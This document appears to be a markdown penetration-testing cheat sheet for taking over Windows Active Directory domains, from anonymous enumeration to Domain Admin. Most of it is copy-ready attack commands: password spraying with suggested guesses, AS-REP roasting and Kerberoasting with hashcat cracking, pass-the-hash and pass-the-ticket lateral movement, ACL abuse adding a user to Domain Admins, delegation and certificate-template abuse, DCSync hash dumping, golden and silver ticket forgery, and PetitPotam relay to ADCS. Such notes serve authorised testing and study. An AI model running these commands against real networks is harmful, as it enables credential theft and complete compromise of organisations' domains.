# 🏛️ Active Directory Exploitation

> **Objective:** Compromise Windows domain environments from initial foothold to Domain Admin.

---

## 📋 AD Attack Methodology

```
Phase 1: Enumeration (No Creds)
   - Null sessions, anonymous LDAP
   - AS-REP Roasting (no pre-auth users)
   - Password spraying

Phase 2: Enumeration (With Creds)
   - BloodHound (map attack paths)
   - PowerView / ldapsearch
   - Share enumeration
   - GPP passwords

Phase 3: Credential Attacks
   - Kerberoasting
   - LLMNR/NBT-NS poisoning (Responder)
   - Credential dumping

Phase 4: Lateral Movement
   - Pass-the-Hash
   - Pass-the-Ticket
   - PsExec / WMI / WinRM

Phase 5: Domain Dominance
   - DCSync
   - Golden Ticket
   - Silver Ticket
```

---

## 🔍 Enumeration Without Credentials

### Null Session Enumeration
```bash
# enum4linux
enum4linux -a DC_IP

# rpcclient null session
rpcclient -U "" DC_IP -N
> enumdomusers
> enumdomgroups
> querydispinfo

# ldapsearch anonymous
ldapsearch -x -H ldap://DC_IP -b "DC=domain,DC=local"

# crackmapexec
crackmapexec smb DC_IP -u '' -p '' --users
crackmapexec smb DC_IP -u '' -p '' --shares
```

### AS-REP Roasting (No Pre-Auth)
```bash
# Find users without Kerberos pre-authentication
# No creds needed - just need valid usernames
impacket-GetNPUsers domain.local/ -dc-ip DC_IP -usersfile users.txt -format hashcat -outputfile asrep.txt

# With valid creds (enumerate all vulnerable users)
impacket-GetNPUsers domain.local/user:password -dc-ip DC_IP -request

# Crack with hashcat
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Password Spraying
```bash
# crackmapexec (careful with lockout!)
crackmapexec smb DC_IP -u users.txt -p 'Password123!' --continue-on-success

# kerbrute (faster, less noise)
kerbrute passwordspray -d domain.local --dc DC_IP users.txt 'Password123!'

# Common passwords to try:
# Season+Year: Spring2024!, Summer2024!
# Company+123: CompanyName123!
# Password1, Welcome1, P@ssw0rd
```

---

## 🔍 Enumeration With Credentials

### BloodHound
```bash
# Collect data with SharpHound
.\SharpHound.exe -c All
.\SharpHound.exe -c All --ldapusername user --ldappassword pass

# Or from Linux with bloodhound-python
bloodhound-python -u user -p 'password' -d domain.local -ns DC_IP -c All

# Import .zip into BloodHound GUI
# Key queries:
# - Shortest Path to Domain Admin
# - Find all Kerberoastable users
# - Find AS-REP Roastable users
# - Shortest Path from Owned Principals
```

### PowerView (from Windows)
```powershell
# Import
Import-Module .\PowerView.ps1

# Domain info
Get-Domain
Get-DomainController

# Users
Get-DomainUser | Select-Object samaccountname,description
Get-DomainUser -SPN  # Kerberoastable users

# Groups
Get-DomainGroup | Select-Object samaccountname
Get-DomainGroupMember "Domain Admins"

# Computers
Get-DomainComputer | Select-Object dnshostname,operatingsystem

# Shares
Find-DomainShare -CheckShareAccess

# ACLs (find exploitable permissions)
Find-InterestingDomainAcl -ResolveGUIDs
```

### From Linux (with creds)
```bash
# ldapsearch
ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName

# crackmapexec
crackmapexec smb DC_IP -u user -p pass --shares
crackmapexec smb DC_IP -u user -p pass --users
crackmapexec smb DC_IP -u user -p pass --groups
crackmapexec smb DC_IP -u user -p pass -M spider_plus
```

---

## 🎫 Kerberoasting

```bash
# From Linux
impacket-GetUserSPNs domain.local/user:password -dc-ip DC_IP -request -outputfile kerberoast.txt

# From Windows (Rubeus)
.\Rubeus.exe kerberoast /outfile:kerberoast.txt

# From Windows (PowerView)
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File kerberoast.txt

# Crack with hashcat
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r best64.rule
```

---

## 🔄 Lateral Movement

### Pass-the-Hash (PtH)
```bash
# crackmapexec (check if hash works)
crackmapexec smb targets.txt -u administrator -H NTLM_HASH

# impacket-psexec
impacket-psexec domain.local/administrator@TARGET -hashes :NTLM_HASH

# impacket-wmiexec
impacket-wmiexec domain.local/administrator@TARGET -hashes :NTLM_HASH

# evil-winrm
evil-winrm -i TARGET -u administrator -H NTLM_HASH
```

### Pass-the-Ticket (PtT)
```bash
# Export tickets (Rubeus)
.\Rubeus.exe dump

# Import ticket
.\Rubeus.exe ptt /ticket:base64_ticket

# From Linux (convert .kirbi to .ccache)
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
impacket-psexec domain.local/user@TARGET -k -no-pass
```

### Execution Methods
```bash
# PsExec (creates service, very noisy)
impacket-psexec domain/user:pass@TARGET
impacket-psexec domain/user@TARGET -hashes :HASH

# WMIExec (stealthier, no service creation)
impacket-wmiexec domain/user:pass@TARGET

# SMBExec
impacket-smbexec domain/user:pass@TARGET

# Evil-WinRM (if WinRM is open - port 5985)
evil-winrm -i TARGET -u user -p 'password'

# WinRM from PowerShell
Enter-PSSession -ComputerName TARGET -Credential domain\user
```

---

## 🔑 ACL Abuse

### Common Exploitable ACLs
| Permission | Exploit |
|-----------|---------|
| GenericAll | Full control - reset password, add to group |
| GenericWrite | Modify attributes - set SPN for Kerberoast |
| WriteDACL | Modify ACL - grant yourself GenericAll |
| WriteOwner | Take ownership - then modify ACL |
| ForceChangePassword | Reset user's password |
| AddMember | Add yourself to a group |

### Exploitation
```powershell
# GenericAll on User → reset password
net user targetuser NewPass123! /domain
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPass!' -AsPlainText -Force)

# GenericAll on Group → add yourself
Add-DomainGroupMember -Identity "Domain Admins" -Members "youruser"
net group "Domain Admins" youruser /add /domain

# GenericWrite on User → set SPN for Kerberoast
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'}
# Then Kerberoast that user

# WriteDACL → grant yourself GenericAll
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity youruser -Rights All

# ForceChangePassword
rpcclient -U "domain/user%pass" DC_IP
> setuserinfo2 targetuser 23 'NewPass123!'
```

---

## 🎟️ Delegation Attacks

### Unconstrained Delegation
```powershell
# Find computers with unconstrained delegation
Get-DomainComputer -Unconstrained | Select-Object dnshostname

# If you compromise that machine:
# Any user authenticating to it leaves their TGT in memory
# Extract with Mimikatz or Rubeus
.\Rubeus.exe monitor /interval:5
# Coerce authentication with PrinterBug/PetitPotam
```

### Constrained Delegation
```bash
# Find accounts with constrained delegation
Get-DomainUser -TrustedToAuth | Select-Object samaccountname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth

# Exploit with impacket (request ticket for allowed service)
impacket-getST -spn cifs/target.domain.local -impersonate administrator domain.local/svc_account:password -dc-ip DC_IP
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass target.domain.local
```

### Resource-Based Constrained Delegation (RBCD)
```bash
# If you have GenericWrite on a computer object:
# 1. Create a machine account (or use one you control)
impacket-addcomputer domain.local/user:pass -computer-name 'FAKE$' -computer-pass 'FakePass123!'

# 2. Set RBCD on target
impacket-rbcd domain.local/user:pass -delegate-from 'FAKE$' -delegate-to 'TARGET$' -dc-ip DC_IP -action write

# 3. Get ticket
impacket-getST -spn cifs/TARGET.domain.local -impersonate administrator domain.local/'FAKE$':'FakePass123!' -dc-ip DC_IP

# 4. Use ticket
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass TARGET.domain.local
```

---

## 📜 ADCS (Certificate Attacks)

### Enumeration
```bash
# Certipy
certipy find -u user@domain.local -p 'password' -dc-ip DC_IP -vulnerable

# From Windows
.\Certify.exe find /vulnerable
```

### ESC1 (Enrollee supplies subject)
```bash
# Request cert as another user
certipy req -u user@domain.local -p 'password' -ca CA-NAME -target DC_IP -template VulnTemplate -upn administrator@domain.local

# Authenticate with cert
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

---

## 🏆 Domain Dominance

### DCSync (extract all hashes)
```bash
# Need: Replicating Directory Changes + Replicating Directory Changes All
# (Domain Admins, Enterprise Admins have this by default)

# From Linux
impacket-secretsdump domain.local/admin:password@DC_IP
impacket-secretsdump domain.local/admin@DC_IP -hashes :HASH

# From Windows (Mimikatz)
mimikatz# lsadump::dcsync /domain:domain.local /user:krbtgt
mimikatz# lsadump::dcsync /domain:domain.local /all /csv
```

### Golden Ticket
```bash
# Need: krbtgt NTLM hash + Domain SID

# Get domain SID
impacket-lookupsid domain.local/user:pass@DC_IP

# Create Golden Ticket (Mimikatz)
mimikatz# kerberos::golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# From Linux (impacket)
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass domain.local/administrator@DC_IP
```

### Silver Ticket
```bash
# Need: Service account NTLM hash + Domain SID
# Forges a TGS for a specific service (no DC contact needed)

impacket-ticketer -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target.domain.local administrator
```

---

## 🔫 Coercion Attacks

### PetitPotam (force DC to authenticate to you)
```bash
# Coerce DC to authenticate to your listener
python3 PetitPotam.py LISTENER_IP DC_IP

# Combine with ntlmrelayx to relay to ADCS:
ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

### PrinterBug
```bash
# Force target to authenticate back to you
python3 printerbug.py domain/user:pass@TARGET LISTENER_IP
```

---

## 🔗 Quick Reference

```bash
# === FIRST STEPS (no creds) ===
enum4linux -a DC_IP
crackmapexec smb DC_IP -u '' -p '' --shares --users
impacket-GetNPUsers domain.local/ -dc-ip DC_IP -usersfile users.txt -format hashcat

# === WITH CREDS ===
bloodhound-python -u user -p pass -d domain.local -ns DC_IP -c All
impacket-GetUserSPNs domain.local/user:pass -dc-ip DC_IP -request
crackmapexec smb DC_IP -u user -p pass --shares

# === LATERAL MOVEMENT ===
crackmapexec smb targets.txt -u user -p pass
impacket-psexec domain/user:pass@TARGET
evil-winrm -i TARGET -u user -p pass

# === DOMAIN ADMIN ===
impacket-secretsdump domain/admin:pass@DC_IP
```

---

## 🔗 Associated Tools
- BloodHound - Attack path mapping
- CrackMapExec - AD swiss army knife
- Impacket - Python AD tools
- Rubeus - Kerberos attacks (Windows)
- Certipy - ADCS attacks
- [Hashcat](../../TOOLS/Hashcat.md) - Crack Kerberos tickets
- [Hydra](../../TOOLS/hydra.md) - Password spraying
